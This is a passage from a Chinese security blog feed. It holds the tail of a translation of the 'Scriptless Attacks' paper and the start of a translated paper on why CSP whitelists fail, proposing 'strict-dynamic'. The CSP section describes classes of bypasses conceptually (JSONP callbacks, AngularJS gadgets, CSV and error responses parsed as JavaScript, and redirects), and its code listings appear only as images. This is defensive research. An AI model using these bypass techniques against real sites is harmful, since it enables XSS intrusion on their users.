现一些攻击向量仅在XSS过滤后被激活。与其他方法相比，它们倾向于将XSSAUDITOR放在HTML解析器和JavaScript引擎之间。但是，这种设计不会阻止无脚本攻击，因为它们不针对JavaScript引擎。</p><p>Curtsinger等提出了一个名为ZOZZLE的浏览器扩展，用于对带有贝叶斯分类的恶意JavaScript代码进行分类。如果这种基于学习的防御机制能够对抗无脚本攻击，那么这仍然是一个悬而未决的问题</p><p>Pietraszek等人介绍了上下文敏感的字符串评估（CSSE），这是一个通过依赖一组元数据来检查传入的用户生成数据字符串的库</p><p>根据从附加元数据派生的上下文，正在应用不同的过滤和转义方法来保护现有应用程序。这种低级方法被描述为对现有应用程序可操作，几乎不需要应用程序开发人员实施。</p><p>Kirda等。提出了一个名为Noxes的客户端XSS预防工具。通过防止浏览器联系不属于Web应用程序域的URL，此工具可防止攻击者将敏感数据泄露给其服务器。从概念的角度来看，这种方法也可以用来限制对手可以通过无脚本攻击实现的目标，因为它可以防止侧通道泄露被盗信息。此外，作者根据攻击者可以选择的编码和混淆技术的多种方式，详细阐述了服务器端XSS检测和预防的难点。以类似的方式，我们认为无法在服务器端阻止无脚本攻击。</p><p>吉姆等人。引入了浏览器强制嵌入式策略（BEEP)，这是一种策略驱动的浏览器扩展，能够控制某个脚本是否可以执行。</p><p>更具体地说，BEEP使用户能够将合法脚本列入白名单并禁用网页的某些区域的脚本。整个概念代表了CSP的另一个基础。 Nadji等人。提出了类似的方法：文档结构完整性（DSI）确保动态内容与服务器端的静态内容分离，而两者在客户端以完整性保留方式组合。</p><p>Louw和Venkatakrishnan的蓝图遵循类似的方法：服务器端应用程序将内容编码为模型表示，可以由工具的客户端部分处理。 </p><p>Saxena等介绍了ScriptGuard，一种上下文敏感的XSS卫生工具，能够自动进行上下文检测和一致的卫生例程选择。请注意，所有这些方法都侧重于防止代码脚本，这意味着无脚本攻击可能会绕过这种保护机制，因为我们不使用动态内容。</p><p>Heiderich等。发布了由SVG图形绕过现代HTML清理程序引起的XSS漏洞以及在浏览器恶意软件和复杂的跨上下文脚本攻击的情况下基于DOM的攻击检测。</p><p>Martin和Lam 以及Kieyzun等人引入了能够自动生成针对Web应用程序的XSS和SQL注入攻击的工具。 XSSDS 是一个通过比较HTTP请求和响应来确定攻击是否真正成功的系统。在最近的论文中，提供了发现参数注入和参数篡改漏洞的不同方法。这些类型的工具尚不可用于自动发现和创建无脚本攻击，尽管我们期望可以识别类似的概念并将其应用于将来适当一致的工具开发。</p><h2 id="总结和展望"><a href="#总结和展望" class="headerlink" title="总结和展望"></a><strong>总结和展望</strong></h2><p>在本文中，我们介绍了一类针对Web应用程序的攻击，我们将其称为无脚本攻击。这些攻击的关键属性是它们不依赖于JavaScript（或任何其他语言）代码的执行。相反，它们完全基于现代用户代理中可用的标准浏览器功能，并在当前的HTML和CSS3规范草案中定义。在某种程度上，这种攻击可以看作是基于CSS的历史偷窃和类似攻击向量的概括。我们讨论了几种对无脚本攻击有用的浏览器功能，包括攻击者可以访问信息或建立辅助通道的各种方式。此外，我们针对示例性Web应用程序提出了几种无脚本攻击，并演示了攻击者如何通过滥用合法的浏览器概念成功获取敏感信息，如CSRF令牌或用户输入。此外，我们还发现攻击者还可以泄露特定信息并建立使这种攻击可行的辅助渠道。</p><p>虽然本文中讨论的攻击可能并不代表非法检索敏感用户数据的全部方法，但我们认为我们讨论的攻击组件对其他攻击媒介非常重要。因此，详细分析和进一步详细阐述与可能的防御机制有关的调查可能会产生更多的攻击媒介。我们希望本文能够刺激针对不依赖于JavaScript代码执行的Web应用程序的攻击。</p><p>作为另一个贡献，我们引入了一个浏览器补丁，使网站能够确定它是否在分离视图或弹出窗口中加载，展示了针对多种攻击的缓解技术。在我们未来的工作中，我们将研究更多处理和防止无脚本攻击的方法。</p><h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a><strong>原文链接</strong></h2><p><a href="https://www.ei.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf">https://www.ei.ruhr-uni-bochum.de/media/emma/veroeffentlichungen/2012/08/16/scriptlessAttacks-ccs2012.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>翻译</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论白名单的不安全性与内容安全策略的未来(半机翻有删增)</title>
    <link href="/2019/03/07/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A5(%E5%8D%8A%E7%BF%BB%E8%AF%91%E6%9C%89%E5%88%A0%E5%A2%9E)/"/>
    <url>/2019/03/07/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A5(%E5%8D%8A%E7%BF%BB%E8%AF%91%E6%9C%89%E5%88%A0%E5%A2%9E)/</url>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a><strong>摘要</strong></h2><p>内容安全策略是一种Web平台机制，旨在<strong>缓解</strong>现代Web应用程序中的顶级安全漏洞跨站点脚本（XSS)。在本文中，我们仔细研究了采用CSP的实际好处，并在实际部署中识别出重要的aws，导致所有不同策略的94.72％被绕过。</p><p>我们的互联网范围内的分析基于来自超过10亿个主机名的大约1000亿页的搜索引擎语料库;结果涵盖了1,680,867个主机上的CSP部署，以及26,011个独特的CSP策略(迄今为止最全面的研究)。我们介绍了CSP规范的安全相关方面，并对其威胁模型进行了深入分析，重点关注XSS保护。</p><p>我们确定了<strong>三种常见的CSP绕过类并解释了它们如何破坏策略的安全性。</strong></p><p>然后，我们转向对因特网上部署的策略进行定量分析，以了解其安全性。我们观察到15个域中最常用于加载脚本的白名单中有14个包含不安全的端点;因此，<strong>75.81％的不同策略使用允许攻击者绕过CSP的脚本白名单</strong>。总的来说，我们发现<strong>94.68％的试图限制脚本执行的策略是无效的，99.34％的CSP主机使用的策略对预防XSS没有好处</strong></p><p>最后，<strong>我们提出了 “strict-dynamic” 关键字</strong>，这是对规范的补充，<strong>有助于创建基于加密nonces的策略</strong>，而不依赖于域白名单。我们讨论了<strong>在复杂应用程序中部署这种基于随机数的策略的经验</strong>，并为Web开发者提供了改进其策略的指导。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a><strong>介绍</strong></h2><span id="more"></span><p>XSS — <strong>将攻击者控制的脚本注入Web应用程序的上下文的能力</strong>，可以说是最臭名昭着的Web漏洞。自从2000年CERT公告中第一次正式引用XSS以来，几代研究人员和从业者已经研究了检测，预防和减轻这个问题的方法</p><p>尽管有这些优点，XSS仍然是网络上最普遍的安全问题之一，随着网络的发展，不断发现新的变化。</p><p><strong>如今，CSP（内容安全策略）是针对XSS的最有前途的对策之一。</strong></p><p>CSP是一种声明性策略机制，<strong>允许Web应用程序开发人员确定浏览器可以加载和执行哪些客户端资源</strong>。通过禁止内联脚本并仅允许受信任的域作为外部脚本的源，CSP旨在限制站点执行恶意客户端代码的能力。因此，即使攻击者能够找到XSS漏洞，CSP也可以通过防止利用漏洞来保护应用程序安全（攻击者无法在不控制可信主机的情况下加载恶意代码）</p><p>在本文中，我们介绍了对Web上CSP部署安全性的第一次深入分析的结果。<br>为了做到这一点，我们首先通过审查其威胁模型，分析可能的配置缺陷并列举允许攻击者绕过其保护的鲜为人知的技术来研究CSP的保护能力。</p><p>我们使用从Google搜索索引中提取的现实世界CSP政策进行大规模的实证研究。基于此数据集，我们发现目前至少有1,680,000个Internet主机部署了CSP策略。在对我们的数据集进行规范化和重复数据删除之后，我们确定了26,011个独特的CSP策略，<strong>其中94.72％可以轻易绕过</strong>，攻击者可以<strong>使用自动化方法来查找允许破坏CSP保护的端点</strong>。即使在许多情况下，在部署CSP方面花费了相当多的工作，<strong>但90.63％的当前策略包含通过允许执行内联脚本或从任意外部主机加载脚本来破坏任何XSS保护的配置</strong>。我们数据集中只有9.37％的策略具有更严格的配置，并且可以防范XSS。但是，我们发现至少有51.05％的此类政策仍然可以绕过，因为 script-src 白名单中存在微妙的错误策略配置或源自不安全端点的原因。</p><p>根据我们的研究结果，<strong>我们得出结论，在复杂的应用中保持安全的白名单在实践中是不可行的</strong>;因此，我们<strong>建议改变CSP的使用方式</strong>。<strong>我们建议通过指定脚本可以执行的URL白名单来指定信任的模型应该替换为基于nonces和hashes的方法</strong>，已经由CSP规范定义并且可以在主要的浏览器实现中使用。</p><p>在 nonce-based 的策略中**，应用程序不是将主机和域列入白名单以执行脚本**，而是在CSP策略中为合法的应用程序控制脚本的HTML属性提供<strong>一次性的</strong>，<strong>不可猜解</strong>的 token。</p><p><strong>用户代理(浏览器)只允许执行其 nonce 与策略中指定的值匹配的那些脚本</strong>;攻击者并不能知道易受注入攻击页面的标签的 nonce 的值，因此无法执行恶意脚本。为了简化这种 nonce-based 的方法的过程(这种方式在动态生成的脚本的执行上会有无法生成 nonce 的弊端)，我们为’script-src’提供了一个新的CSP源表达式，暂时称为’strict-dynamic’。使用 “strict-dynamic”，<strong>动态生成的脚本会从创建它们的可信脚本中隐式继承nonce</strong>。通过这种方式，<strong>已经执行的合法脚本可以轻松地向DOM添加新脚本，而无需进行大量的应用程序更改</strong>。因此，即使攻击者发现了 XSS 漏洞，但是却不知道正确的nonce，也还是无法滥用此功能，因为它们无法在第一时间执行脚本。</p><p>为了证明这种方法的可行性，我们提出了一个在流行的应用程序中<strong>采用基于随机数的策略的实际案例研究</strong></p><p><strong>我们的贡献可归纳如下：</strong></p><ul><li>我们介绍了对CSP安全模型的第一次深入分析的结果，分析了对标准提供的Web错误的保护。我们确定了共同的策略错误配置，并提出了三类绕过 CSP 的方法。</li><li>我们通过从Google搜索索引中提取策略，对实际CSP部署的好处进行了大规模的实证研究。基于大约1060亿页的语料库，其中39亿页受CSP保护，我们确定了26,011个独特的政策。我们发现，由于政策错误配置和不安全的白名单条目，这些政策中至少有94.72％对缓解XSS无效。</li><li>根据我们的观点，我们建议改变内容安全策略在实践中的部署方式：**我们提倡基于nonce的方法，而不是白名单。**为了进一步推广这种方法，我们提出了“strict-dynamic”，<strong>这是目前在Chromium浏览器中实现的CSP3规范的一个新特性</strong>。我们讨论了这种方法的好处，并提出了在流行的Web应用程序中基于nonce和strict-dynamic部署策略的案例研究。</li></ul><h2 id="内容安全策略"><a href="#内容安全策略" class="headerlink" title="内容安全策略"></a><strong>内容安全策略</strong></h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>内容安全策略（CSP）是一种声明性机制，允许Web作者在其应用程序上指定许多安全限制，会由支持该项技术的用户代理(浏览器)强制执行。</p><p>CSP旨在成为 “开发人员可以用来以各种方式锁定其应用程序，降低内容注入漏洞（…）的风险并降低其应用程序执行的权限的工具。“</p><p>CSP正在快速发展：<strong>目前正在进行规范的版本是CSP3</strong>，并且该标准由用户代理不均衡地实现。例如，Chromium具有完整的CSP2支持并实现了CSP3的大部分工作草案，在某些情况下落后于实验运行时标志，而Mozilla Firefox和基于WebKit的浏览器最近刚刚获得了完整的CSP2支持。在讨论CSP的细节时，我们不关注标准的任何特定修订，而是尝试提供跨实现和版本的广泛概述。</p><p>CSP策略在Content-Security-Policy HTTP响应头或<code>&lt;meta&gt;</code>元素中提供。 </p><h4 id="CSP的功能可分为三类："><a href="#CSP的功能可分为三类：" class="headerlink" title="CSP的功能可分为三类："></a><strong>CSP的功能可分为三类：</strong></h4><h5 id="1-资源加载限制"><a href="#1-资源加载限制" class="headerlink" title="1.资源加载限制"></a><strong>1.资源加载限制</strong></h5><p>CSP最着名和最常用的是限制将各种子资源加载到开发人员允许的一组源（称为源列表）的能力。常用的指令是script-src，style-src，img-src和覆盖全部的default-src;<strong>表1中显示了管理资源的完整指令列表</strong>。作为一种特殊情况，script-src和style-src指令可以使用其他几个配置选项。这些允许对脚本和样式表进行更细致的控制，下面将对此进行讨论。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A51.png" alt="此处输入图片的描述"></p><h5 id="2-基于URL的辅助限制"><a href="#2-基于URL的辅助限制" class="headerlink" title="2.基于URL的辅助限制"></a><strong>2.基于URL的辅助限制</strong></h5><p>通过监管所获取的子资源不能防止一些类型的攻击，但同样需要文档可以与之交互的可信来源的概念。一个常见的例子是 frame-ancestors 指令，<strong>它定义了允许构建文档以防止点击劫持的起源</strong>。类似地，base-uri 和form-action可以将URL作为<code>&lt;base＃href&gt;</code>和<code>&lt;form＃action&gt;</code>元素的目标，以防止一些 post-XSS攻击。</p><h5 id="3-杂项连接和硬化选项"><a href="#3-杂项连接和硬化选项" class="headerlink" title="3.杂项连接和硬化选项"></a><strong>3.杂项连接和硬化选项</strong></h5><p>由于缺乏在Web应用程序中启用安全性限制的其他常用机制，CSP已成为几种松散安全功能的基础。这包括block-all-mixed-content 和 upgrade-insecure-requests关键字，可以防止混合内容错误并改善HTTPS支持;插件类型，限制允许的插件格式;反映了HTML5沙箱框架的安全功能的 sandbox。</p><p>为了使Web应用程序与对XSS有用的内容安全策略兼容，<strong>Web开发者通常必须重构应用程序逻辑生成的HTML标记，以及框架和模板系统。</strong></p><p>特别是内联脚本，必须避免使用eval和等效构造，内联事件处理程序和javascript：URI，使用CSP友好的替代方法。</p><p>除了强制执行策略限制的默认行为之外，还可以在 Report-Only 模式下配置CSP，其中只记录违规但不强制执行。在这两种情况下，report-uri指令可用于发送违规报告，以通知应用程序所有者不兼容的标记。</p><h4 id="源列表"><a href="#源列表" class="headerlink" title="源列表"></a><strong>源列表</strong></h4><p><strong>CSP源列表（通常称为白名单）<strong>是CSP的核心部分，是指定信任关系的</strong>传统方式</strong>。例如，如清单1所示，应用程序可能选择仅信任其托管域以加载脚本，但允许来自cdn.example.org和third-party.org的字体或图像，并要求通过HTTPS加载帧，同时对其他资源类型不施加任何限制。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A52.png" alt="此处输入图片的描述"></p><p>对于任何指令，白名单可以由主机名（example.org，example.com）组成，可能包括<code>*</code>通配符以将信任扩展到所有子域（<code>*.example.org</code>）; scheme（https：，data:);和特殊关键字’self’，表示当前文档的来源，<strong>‘none’，强制执行空源列表并禁止加载任何资源。</strong></p><p><strong>从CSP2开始，作者还可以选择在白名单中指定路径</strong>（example.org&#x2F;resources&#x2F;js&#x2F;）。<br>有趣的是，不能依赖基于路径的限制来限制可以加载资源的位置;</p><h4 id="脚本执行的限制"><a href="#脚本执行的限制" class="headerlink" title="脚本执行的限制"></a><strong>脚本执行的限制</strong></h4><p>由于现代Web应用程序中脚本的重要性，script-src指令提供了几个关键字，以允许更精细地控制脚本执行：</p><h5 id="1-unsafe-inline"><a href="#1-unsafe-inline" class="headerlink" title="1.unsafe-inline"></a><strong>1.unsafe-inline</strong></h5><p>允许执行内联<code>&lt;script&gt;</code>块和JavaScript事件处理程序（<strong>有效地删除针对XSS的任何CSP保护</strong>）</p><h5 id="2-unsafe-eval"><a href="#2-unsafe-eval" class="headerlink" title="2.unsafe-eval"></a><strong>2.unsafe-eval</strong></h5><p>允许将字符串数据作为代码执行的JavaScriptAPI，例如eval()，setTimeout()，setInterval()和Function构造函数。<strong>否则，这些API将被具有script-src指令的策略阻止。</strong></p><h5 id="3-nonce"><a href="#3-nonce" class="headerlink" title="3.nonce"></a><strong>3.nonce</strong></h5><p>CSP nonce 允许策略指定一个一次性值，该值用作脚本的授权 token（script-src ‘nonce-random-value’）。将允许页面上具有正确的 nonce &#x3D;”random-value”属性的任何脚本执行。</p><h5 id="4-hash"><a href="#4-hash" class="headerlink" title="4.hash"></a><strong>4.hash</strong></h5><p>CSP hash 允许开发人员列出页面内预期脚本的加密哈希值（script-src ‘sha256-nGA …’）。将允许执行其摘要与策略中提供的值匹配的任何内联脚本。</p><p>Nonce和hashes可以类似地与style-src指令一起使用，以允许通过nonce值加载内联样式表和外部CSS。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A53.png" alt="此处输入图片的描述"></p><h3 id="CSP的威胁模型"><a href="#CSP的威胁模型" class="headerlink" title="CSP的威胁模型"></a><strong>CSP的威胁模型</strong></h3><p>为了使CSP能够提供安全保护，它必须防止攻击者利用,否则会对应用程序的用户启用恶意操作。</p><h4 id="CSP提供三种漏洞的保护"><a href="#CSP提供三种漏洞的保护" class="headerlink" title="CSP提供三种漏洞的保护"></a><strong>CSP提供三种漏洞的保护</strong></h4><h5 id="1-XSS："><a href="#1-XSS：" class="headerlink" title="1.XSS："></a><strong>1.XSS：</strong></h5><p>在易受攻击的应用程序中注入和执行不受信任的脚本的能力**（受script-src和object-src指令保护）**</p><h5 id="2-点击劫持："><a href="#2-点击劫持：" class="headerlink" title="2.点击劫持："></a><strong>2.点击劫持：</strong></h5><p>通过在<strong>攻击者控制的页面上</strong>覆盖隐藏的帧来强制用户在受影响的应用程序中执行不需要的操作**（通过限制框架祖先的框架来保护）**</p><h5 id="3-混合内容："><a href="#3-混合内容：" class="headerlink" title="3.混合内容："></a><strong>3.混合内容：</strong></h5><p>意外地从通过HTTPS传递的页面上的不安全协议加载资源**（使用upgrade-insecure-requests和block-all-mixed-content关键字保护，并限制脚本和敏感资源加载到https :)。**</p><p>因此，<strong>只有一小部分CSP指令对XSS保护有用</strong>。此外，在应用程序的上下文中执行恶意脚本的能力颠覆了所有其他指令所提供的保护</p><h4 id="采用CSP的好处"><a href="#采用CSP的好处" class="headerlink" title="采用CSP的好处"></a><strong>采用CSP的好处</strong></h4><p>由于一些流行的用户代理(浏览器)尚不支持CSP或者只支持部分支持，因此在主要安全机制失败的情况下，CSP应仅用作深度防御以阻止攻击尝试**。因此，使用CSP的应用程序还必须采用传统的保护机制**;例如，使用具<strong>有严格上下文转义的框架来生成标记</strong>，使用 X-Frame-Options 标头来防止点击劫持，并确保通过HTTPS获取安全页面上的资源。</p><p>设置内容安全策略的实际好处只有在主要安全机制已证明不足时才会出现–CSP可以帮助保护用户，当开发人员引入编程错误时，否则会导致XSS，点击劫持或混合内容错误。</p><p>然而，实际上 X-Frame-Options 的点击劫持保护很少被攻破，并且在现代用户代理中默认情况下已禁止活动混合内容（通过HTTP从HTTPS网页加载的脚本和其他活动内容）。因此，**CSP的主要价值在于防止利用XSS，**因为它是唯一可以通过CSP缓解并且通常可以减轻的漏洞类别。</p><h4 id="防御XSS"><a href="#防御XSS" class="headerlink" title="防御XSS"></a><strong>防御XSS</strong></h4><p><strong>CSP的安全优势主要集中在两个阻止脚本执行的指令</strong>：script-src和object-src（Adobe Flash等插件可以在嵌入页面的上下文中执行JavaScript），或者在他们缺省情况下的 default-src。</p><p>可以注入和执行脚本的攻击者能够绕过所有其他指令的限制。因此，使用不安全的 script-src 和 object-src 源列表策略的应用程序从CSP获得的优势就非常有限了。</p><p>对于提供有意义的安全性的其他指令，站点必须首先使用成功阻止脚本执行的安全策略。一般来说，非脚本指令可以作为对一些post-XSS 或 scriptless 攻击的防御，例如通过劫持表单URI来删除数据，或通过使用攻击者发布页面UI进行网络钓鱼,但只有当CSP作为XSS保护措施已经有效时，它们才能提高安全性。</p><p><strong>为了实现防止不需要的脚本执行的主要目标,策略必须满足三个要求：</strong></p><h4 id="三大要求"><a href="#三大要求" class="headerlink" title="三大要求"></a><strong>三大要求</strong></h4><ul><li>该策略必须同时定义script-src和object-src指令（或者default-src）</li></ul><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A54.png" alt="此处输入图片的描述"></p><ul><li>script-src源列表不能包含 unsafe-inline 关键字（除非附有nonce）或允许 data：URIs</li></ul><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A55.png" alt="此处输入图片的描述"></p><ul><li>script-src和object-src源列表<strong>不能包含允许攻击者控制响应</strong>的安全相关部分或包含不安全库的任何端点。</li></ul><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A56.png" alt="此处输入图片的描述"></p><p><strong>如果不满足任何这些条件，则该策略在防止脚本执行方面没有效果，因此无法防止内容注入攻击。</strong></p><p>我们现在转向对端点类型的分析，<strong>这些端点在托管在白名单源上时允许攻击者绕过针对脚本执行的CSP保护。</strong></p><h3 id="脚本执行绕过"><a href="#脚本执行绕过" class="headerlink" title="脚本执行绕过"></a><strong>脚本执行绕过</strong></h3><p><strong>CSP的一个基本假设是，策略中列入白名单的域仅提供安全内容</strong>。因此，攻击者不能在此类列入白名单的来源的响应中注入有效的JavaScript。</p><p>在以下小节中，我们证明了在实践中，<strong>现代Web应用程序倾向于使用违反此假设的几种模式。</strong></p><h4 id="1-具有用户控制的回调的JavaScript"><a href="#1-具有用户控制的回调的JavaScript" class="headerlink" title="1.具有用户控制的回调的JavaScript"></a><strong>1.具有用户控制的回调的JavaScript</strong></h4><p>虽然许多JavaScript资源是静态的，但在某些情况下，开发人员可能希望通过允许请求参数设置在加载脚本时执行的函数来动态生成脚本的一部分。例如，<strong>在回调函数中包装JavaScript对象的JSONP接口通常用于允许加载API数据</strong>，方法是将其作为脚本从第三方域获取：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A57.png" alt="此处输入图片的描述"></p><p>遗憾的是，<strong>如果策略中列入白名单的域包含JSONP接口，则攻击者可以使用它在易受攻击的页面上下文中执行任意JavaScript函数</strong>，方法是将端点作为带有攻击者控制的回调的<code>&lt;script&gt;</code>加载。<strong>如果攻击者可以控制JSONP响应的整个开始，他们将获得无约束的脚本执行</strong>。如果字符集受到限制，因此只有函数名称是可控的，它们可以使用诸如SOME之类的技术，这些技术通常在定性上等同于完整的，无约束的XSS。</p><h4 id="2-反射或者符号执行"><a href="#2-反射或者符号执行" class="headerlink" title="2.反射或者符号执行"></a><strong>2.反射或者符号执行</strong></h4><p>CSP脚本执行的限制可能（通常是偶然）被白名单源中的协作脚本规避。例如，脚本可以使用反射来查找并调用全局范围中的函数，如清单7所示。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A514.png" alt="此处输入图片的描述"></p><p>这样的 JavaScript小技巧通常不会危及安全性，<strong>因为它们的参数处于其页面加载脚本的开发人员的控制之下</strong>。当这样的脚本通过检查DOM获取数据时技巧会出现问题，如果应用程序具有标签注入bug（攻击者可以执行任意函数，可能使用无约束的参数，绕过CSP，则可以部分地受到攻击者控制）。</p><p>一个实际的例子是流行的AngularJS库的行为，它允许创建具有强大的模板语法和客户端模板评估的单页面应用程序（清单8）。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A515.png" alt="此处输入图片的描述"></p><p>为了实现其目标，AngularJS在页面的指定部分解析模板并执行它们。<strong>控制Angular解析的模板的能力可以被认为等同于执行任意JavaScript</strong>。默认情况下，Angular使用eval() 函数来评估沙箱表达式，这是没有unsafe-eval关键字的CSP策略所禁止的。但是**，Angular还附带了一个CSP兼容模式“（ng-csp），其中表达式通过执行符号执行来计算，从而可以在CSP中调用任意JavaScript代码。**</p><p>因此，可以从CSP中列入白名单的域加载Angular库的攻击者可以将其用作JS小工具来绕过脚本执行保护。即使被攻击的应用程序没有使用Angular本身，这也是可能的(唯一要求是将Angular库托管在script-src中列入白名单的域之一上)。因此，<strong>在受信任域中仅存在任何Angular库都会破坏CSP提供的保护。</strong></p><h4 id="3-非预期的JavaScript可解析响应"><a href="#3-非预期的JavaScript可解析响应" class="headerlink" title="3.非预期的JavaScript可解析响应"></a><strong>3.非预期的JavaScript可解析响应</strong></h4><p>出于兼容性原因，<strong>Web浏览器通常很宽松地检查响应的MIME类型是否与使用响应的页面上下文匹配</strong>。任何可以在没有语法错误的情况下解析为JavaScript的响应(并且在第一个运行时错误之前出现攻击者控制的数据)可能导致脚本执行。</p><p><strong>因此，可以使用以下类型的响应绕过CSP：</strong></p><ul><li>具有部分攻击者控制内容的逗号分隔值（CSV）数据：</li></ul><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A516.png" alt="此处输入图片的描述"></p><ul><li>回显请求参数的错误消息：</li></ul><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A517.png" alt="此处输入图片的描述"></p><ul><li>用户文件上传，即使其内容已正确HTML转义或清理</li></ul><p>因此，如果列入白名单的域托管具有此类属性的任何端点，攻击者可以“伪造”脚本响应并执行任意JavaScript。类似的问题适用于object-src白名单**：如果攻击者可以上传将被解释为Flash的资源对象到被 ogject-src列入白名单的域，脚本可以执行。**</p><p>值得注意的是，上述旁路模式都不会带来直接的安全风险，因此开发人员通常没有理由对其进行更改。但是，当应用程序采用CSP时，此类端点会成为安全问题，因为它们允许绕过策略。</p><p>更有问题的是，这个问题不仅影响应用程序的origin，还影响script-src中列入白名单的所有其他域。这些域通常包括可信的第三方和可能不了解CSP的CDN （因此没有理由识别和修复允许CSP绕过的行为）。</p><h4 id="4-路径限制作为安全机制"><a href="#4-路径限制作为安全机制" class="headerlink" title="4.路径限制作为安全机制"></a><strong>4.路径限制作为安全机制</strong></h4><p>为了解决基于域的源列表的不完整粒度问题**，CSP2引入了将白名单约束到给定域上的特定路径的能力**（例如example.org&#x2F;foo&#x2F;bar）。开发人员现在可以选择在受信任的域上指定特定目录以加载脚本和其他资源。</p><p>不幸的是，<strong>由于与处理跨域重定向有关的隐私问题，这种限制已经放宽</strong>。如果源列表条目包含重定向器（端点返回指向另一个位置的30x响应），则该重定向器可用于从白名单源中成功加载资源，即使它们与策略中允许的路径不匹配也是如此。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%AE%BA%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%80%A7%E4%B8%8E%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E6%94%BF%E7%AD%96%E7%9A%84%E6%9C%AA%E6%9D%A518.png" 